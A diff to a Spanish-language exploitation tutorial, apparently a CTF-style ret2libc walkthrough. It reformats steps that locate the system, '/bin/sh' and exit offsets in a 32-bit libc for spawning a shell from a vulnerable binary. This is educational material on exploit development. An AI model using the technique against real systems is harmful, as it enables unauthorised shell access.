@@ -160,11 +160,11 @@ log.info("Base de libc: " + hex(libc_base))
 
 Ahora que tenemos la direccion base de libc podemos pasar a la segunda etapa de nuestro exploit: llamar a `system` con `/bin/sh`. Para esto necesitamos las siguientes direcciones que pueden ser obtenidas mediante los siguientes comandos:
 
-- `system@libc`: `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep system`
+- `system@libc` | Comando:  `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep system`
 Obtenemos `0x00042660`
-- `/bin/sh@libc`: `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`
+- `/bin/sh@libc` | Comando: `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`
 Obtenemos `0x17ff68`
-- `exit@libc`: `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep exit`
+- `exit@libc` | Comando:  `readelf -s -t x /lib/i386-linux-gnu/libc.so.6 | grep exit`
 Obtenemos `0x000356f0`
 
 Ahora las incorporamos a nuestro exploit y hacemos los debidos cálculos para poder usarlas correctamente dentro de la ejecución de nuestro binario:
